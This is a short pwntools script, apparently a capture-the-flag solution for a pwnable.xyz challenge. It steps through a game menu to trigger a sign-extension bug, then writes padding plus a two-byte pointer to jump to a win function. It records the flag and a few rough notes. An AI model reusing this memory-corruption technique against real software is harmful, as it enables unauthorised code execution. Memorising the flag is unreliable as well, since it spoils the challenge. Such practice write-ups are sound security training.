from pwn import *



""" r = process('./challenge') """
r = remote("svc.pwnable.xyz", 30009)
r.recvuntil(": ")
r.sendline("A" * 15)
l = r.recvuntil("> ")
r.sendline("1") # get the 0xff
r.recvuntil("=")
l = r.sendline("1")
l = r.recvuntil("> ")
r.sendline("2") # save game and sign extend
l = r.recvuntil("> ")
r.sendline("3")
r.send(b"a" * 24 + p16(0x9d6)) # name size + score + win pointer
r.recvuntil("> ")
r.sendline("1")
r.interactive()
# flag: FLAG{typ3_c0nv3rsi0n_checked}

# edit name just writes stdout?
# save game so save some pointers?

# eventually we execute play game 

